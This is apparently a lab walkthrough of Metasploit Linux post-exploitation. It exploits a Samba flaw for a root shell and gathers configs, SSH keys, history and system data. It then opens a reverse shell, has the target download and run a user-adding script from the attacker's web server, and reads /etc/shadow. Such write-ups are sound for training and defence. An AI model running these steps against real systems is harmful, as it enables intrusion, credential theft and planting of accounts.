# Linux post exploitation modules

## Exploit the server 

nmap the network
```
root@attackdefense:~# nmap -sS -sV 192.30.131.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-05-01 23:26 UTC

root@attackdefense:~# nmap -sS -sV -p- 192.30.131.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-05-01 23:27 UTC
Nmap scan report for target-1 (192.30.131.3)
Host is up (0.000016s latency).
Not shown: 65533 closed ports
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:42:C0:1E:83:03 (Unknown)
Service Info: Host: VICTIM-1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.18 seconds
```

Scan reveals samba service

Use samba `is_known_pipename` module
```
msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS                           yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf5 exploit(linux/samba/is_known_pipename) > set RHOSTS 192.30.131.3
RHOSTS => 192.30.131.3
msf5 exploit(linux/samba/is_known_pipename) > check

[+] 192.30.131.3:445 - Samba version 4.1.17 found with writeable share 'exploitable'
[*] 192.30.131.3:445 - The target appears to be vulnerable.
msf5 exploit(linux/samba/is_known_pipename) > exploit

[*] 192.30.131.3:445 - Using location \\192.30.131.3\exploitable\tmp for the path
[*] 192.30.131.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.30.131.3:445 - Share 'exploitable' has server-side path '/
[*] 192.30.131.3:445 - Uploaded payload to \\192.30.131.3\exploitable\tmp\DfxTQwMJ.so
[*] 192.30.131.3:445 - Loading the payload from server-side path /tmp/DfxTQwMJ.so using \\PIPE\/tmp/DfxTQwMJ.so...
[-] 192.30.131.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.30.131.3:445 - Loading the payload from server-side path /tmp/DfxTQwMJ.so using /tmp/DfxTQwMJ.so...
[+] 192.30.131.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.30.131.2:44305 -> 192.30.131.3:445) at 2021-05-01 23:38:05 +0000

whoami
root
```

## Linux enum config

https://www.rapid7.com/db/modules/post/linux/gather/enum_configs/

> This module collects configuration files found on commonly installed applications and services, such as Apache, MySQL, Samba, Sendmail, etc. If a config file is found in its default path, the module will assume that is the file we want

Run enum config on the session opened
```
msf5 post(linux/gather/enum_configs) > options

Module options (post/linux/gather/enum_configs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/enum_configs) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_configs) > run

[!] SESSION may not be compatible with this module.
[*] Running module against 192.30.131.3 [victim-1]
[*] Info:
[*]     Debian GNU/Linux 8  
[*]     Linux victim-1 5.4.0-70-generic #78-Ubuntu SMP Fri Mar 19 13:29:52 UTC 2021 x86_64 GNU/Linux
[+] shells stored in /root/.msf4/loot/20210501234021_default_192.30.131.3_linux.enum.conf_718863.txt
[+] sepermit.conf stored in /root/.msf4/loot/20210501234021_default_192.30.131.3_linux.enum.conf_087517.txt
[+] ca-certificates.conf stored in /root/.msf4/loot/20210501234021_default_192.30.131.3_linux.enum.conf_059465.txt
[+] access.conf stored in /root/.msf4/loot/20210501234021_default_192.30.131.3_linux.enum.conf_566190.txt
[+] rpc stored in /root/.msf4/loot/20210501234021_default_192.30.131.3_linux.enum.conf_192787.txt
[+] ldap.conf stored in /root/.msf4/loot/20210501234022_default_192.30.131.3_linux.enum.conf_896591.txt
[+] sysctl.conf stored in /root/.msf4/loot/20210501234022_default_192.30.131.3_linux.enum.conf_629048.txt
[*] Post module execution completed
```

## Linux multi gather environment variable

https://www.rapid7.com/db/modules/post/multi/gather/env/

> This module prints out the operating system environment variables 

Run - not compatible OS
```
msf5 post(multi/gather/env) > set SESSION 1
SESSION => 1
msf5 post(multi/gather/env) > run

[!] SESSION may not be compatible with this module.
PWD=/tmp
[*] Post module execution completed
```

https://www.rapid7.com/db/modules/post/linux/gather/enum_network/

> This module gathers network information from the target system IPTables rules, interfaces, wireless information, open and listening ports, active network connections, DNS information and SSH information. 

Run
```
msf5 post(linux/gather/enum_network) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_network) > run

[!] SESSION may not be compatible with this module.
[*] Running module against victim-1
[*] Module running as root
[+] Info:
[+]     Debian GNU/Linux 8  
[+]     Linux victim-1 5.4.0-70-generic #78-Ubuntu SMP Fri Mar 19 13:29:52 UTC 2021 x86_64 GNU/Linux
[*] Collecting data...
[-] Unable to get data for Network config
[-] Unable to get data for Route table
[+] Firewall config stored in /root/.msf4/loot/20210501234543_default_192.30.131.3_linux.enum.netwo_421684.txt
[+] DNS config stored in /root/.msf4/loot/20210501234543_default_192.30.131.3_linux.enum.netwo_069940.txt
[-] Unable to get data for SSHD config
[+] Host file stored in /root/.msf4/loot/20210501234543_default_192.30.131.3_linux.enum.netwo_833815.txt
[+] SSH keys stored in /root/.msf4/loot/20210501234543_default_192.30.131.3_linux.enum.netwo_184199.txt
[-] Unable to get data for Active connections
[-] Unable to get data for Wireless information
[-] Unable to get data for Listening ports
[+] If-Up/If-Down stored in /root/.msf4/loot/20210501234543_default_192.30.131.3_linux.enum.netwo_405906.txt
[*] Post module execution completed
msf5 post(linux/gather/enum_network) > 
```

## Linux protection enum

https://www.rapid7.com/db/modules/post/linux/gather/enum_protections/

> This module checks whether popular system hardening mechanisms are in place, such as SMEP, SMAP, SELinux, PaX and grsecurity. It also tries to find installed applications that can be used to hinder, prevent, or detect attacks, such as tripwire, snort, and apparmor. This module is meant to identify Linux Secure Modules (LSM) in addition to various antivirus, IDS/IPS, firewalls, sandboxes and other security related software. 

```
msf5 post(linux/gather/enum_protections) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_protections) > run

[!] SESSION may not be compatible with this module.
[*] Running module against 192.30.131.3 [victim-1]
[*] Info:
[*]     Debian GNU/Linux 8  
[*]     Linux victim-1 5.4.0-70-generic #78-Ubuntu SMP Fri Mar 19 13:29:52 UTC 2021 x86_64 GNU/Linux
[*] Finding system protections...
[+] ASLR is enabled
[+] SMEP is enabled
[+] SMAP is enabled
[+] Yama is installed and enabled
[*] Finding installed applications...
[+] iptables found: /sbin/iptables
[+] tcpdump found: /usr/sbin/tcpdump
[+] wireshark found: /usr/bin/wireshark
[*] Post module execution completed
msf5 post(linux/gather/enum_protections) > 
```

## Linux system and user info

https://www.rapid7.com/db/modules/post/linux/gather/enum_system

> This module gathers system information. We collect installed packages, installed services, mount information, user list, user bash history and cron jobs 

```
msf5 post(linux/gather/enum_system) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_system) > run

[!] SESSION may not be compatible with this module.
[+] Info:
[+]     Debian GNU/Linux 8  
[+]     Linux victim-1 5.4.0-70-generic #78-Ubuntu SMP Fri Mar 19 13:29:52 UTC 2021 x86_64 GNU/Linux
[+]     Module running as "root" user
[*] Linux version stored in /root/.msf4/loot/20210501234842_default_192.30.131.3_linux.enum.syste_955637.txt
[*] User accounts stored in /root/.msf4/loot/20210501234842_default_192.30.131.3_linux.enum.syste_538030.txt
[*] Installed Packages stored in /root/.msf4/loot/20210501234842_default_192.30.131.3_linux.enum.syste_938076.txt
[*] Running Services stored in /root/.msf4/loot/20210501234842_default_192.30.131.3_linux.enum.syste_593113.txt
[*] Cron jobs stored in /root/.msf4/loot/20210501234842_default_192.30.131.3_linux.enum.syste_458517.txt
[*] Disk info stored in /root/.msf4/loot/20210501234842_default_192.30.131.3_linux.enum.syste_114111.txt
[*] Logfiles stored in /root/.msf4/loot/20210501234842_default_192.30.131.3_linux.enum.syste_176414.txt
[*] Setuid/setgid files stored in /root/.msf4/loot/20210501234842_default_192.30.131.3_linux.enum.syste_635951.txt
[*] Post module execution completed
```

## Linux check container

https://www.rapid7.com/db/modules/post/linux/gather/checkcontainer/

> This module attempts to determine whether the system is running inside of a container and if so, which one. This module supports detection of Docker, LXC, and systemd nspawn. 

```
msf5 post(linux/gather/checkcontainer) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/checkcontainer) > run

[!] SESSION may not be compatible with this module.
[+] This appears to be a 'Docker' container
[*] Post module execution completed
```

## Linux check vm

https://www.rapid7.com/db/modules/post/linux/gather/checkvm/

> This module attempts to determine whether the system is running inside of a virtual environment and if so, which one. This module supports detection of Hyper-V, VMWare, VirtualBox, Xen, and QEMU/KVM. 

```
msf5 post(linux/gather/checkvm) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/checkvm) > run

[!] SESSION may not be compatible with this module.
[*] Gathering System info ....
[-] Post failed: NoMethodError undefined method `gsub' for nil:NilClass
[-] Call stack:
[-]   /usr/share/metasploit-framework/modules/post/linux/gather/checkvm.rb:74:in `run'
[*] Post module execution completed
```

## Linux gather user history

https://www.rapid7.com/db/modules/post/linux/gather/enum_users_history/

> This module gathers the following user-specific information: shell history, MySQL history, PostgreSQL history, MongoDB history, Vim history, lastlog, and sudoers. 

```
msf5 post(linux/gather/enum_users_history) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_users_history) > run

[!] SESSION may not be compatible with this module.
[+] Info:
[+]     Debian GNU/Linux 8  
[+]     Linux victim-1 5.4.0-70-generic #78-Ubuntu SMP Fri Mar 19 13:29:52 UTC 2021 x86_64 GNU/Linux
[+] Last logs stored in /root/.msf4/loot/20210501235250_default_192.30.131.3_linux.enum.users_763848.txt
[*] Post module execution completed
```

## Reverse shell

https://www.rapid7.com/db/modules/post/multi/manage/system_session/

> This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target. 

```
msf5 post(multi/manage/system_session) > options

Module options (post/multi/manage/system_session):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  false            yes       Start an exploit/multi/handler to receive the connection
   LHOST                     yes       IP of host that will receive the connection from the payload.
   LPORT    4433             no        Port for Payload to connect to.
   SESSION                   yes       The session to run this module on.
   TYPE     auto             yes       Scripting environment on target to use for reverse shell (Accepted: auto, ruby, python, perl, bash)

msf5 post(multi/manage/system_session) > set SESSION 1
SESSION => 1
msf5 post(multi/manage/system_session) > set TYPE python
TYPE => python
msf5 post(multi/manage/system_session) > set HANDLER true
HANDLER => true
msf5 post(multi/manage/system_session) > set LHOST 192.30.131.2
LHOST => 192.30.131.2
msf5 post(multi/manage/system_session) > run

[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.30.131.2:4433 
[*] Python reverse shell selected
[*] Executing reverse tcp shell to 192.30.131.2 on port 4433
[*] Post module execution completed
msf5 post(multi/manage/system_session) > [*] Command shell session 2 opened (192.30.131.2:4433 -> 192.30.131.3:60458) at 2021-05-01 23:55:44 +0000

msf5 post(multi/manage/system_session) > sessions

Active sessions
===============

  Id  Name  Type             Information                                             Connection
  --  ----  ----             -----------                                             ----------
  1         shell cmd/unix                                                           192.30.131.2:44305 -> 192.30.131.3:445 (192.30.131.3)
  2         shell sparc/bsd  /bin/sh: 0: can't access tty; job control turned off #  192.30.131.2:4433 -> 192.30.131.3:60458 (192.30.131.3)
```

Test this reverse shell by creating a script that adds users
```
root@attackdefense:~# cat test.sh
useradd hacker
useradd test
useradd john
```

Start apache server with script available
```
root@attackdefense:~# /etc/init.d/apache2 start
[ ok ] Starting Apache httpd web server: apache2.
root@attackdefense:~# cp test.sh /var/www/html/
```

Use download executables module to get that script
```
msf5 post(linux/manage/download_exec) > options

Module options (post/linux/manage/download_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.
   URL                       yes       Full URL of file to download.

msf5 post(linux/manage/download_exec) > set SESSION 1
SESSION => 1
msf5 post(linux/manage/download_exec) > set URL http://192.30.131.2/test.sh
URL => http://192.30.131.2/test.sh
msf5 post(linux/manage/download_exec) > run

[!] SESSION may not be compatible with this module.
[*] Checking if curl exists in the path...
[+] curl available, using it
[*] Checking if bash exists in the path...
[+] bash available, using it
[*] Post module execution completed
```

Now interact with the shell to check the shadow file - we see new users added
```
msf5 post(linux/manage/download_exec) > sessions -i 1
[*] Starting interaction with 1...

cat /etc/shadow
root:*:17774:0:99999:7:::
daemon:*:17774:0:99999:7:::
bin:*:17774:0:99999:7:::

...

hacker:!:18749:0:99999:7:::
test:!:18749:0:99999:7:::
john:!:18749:0:99999:7:::
```


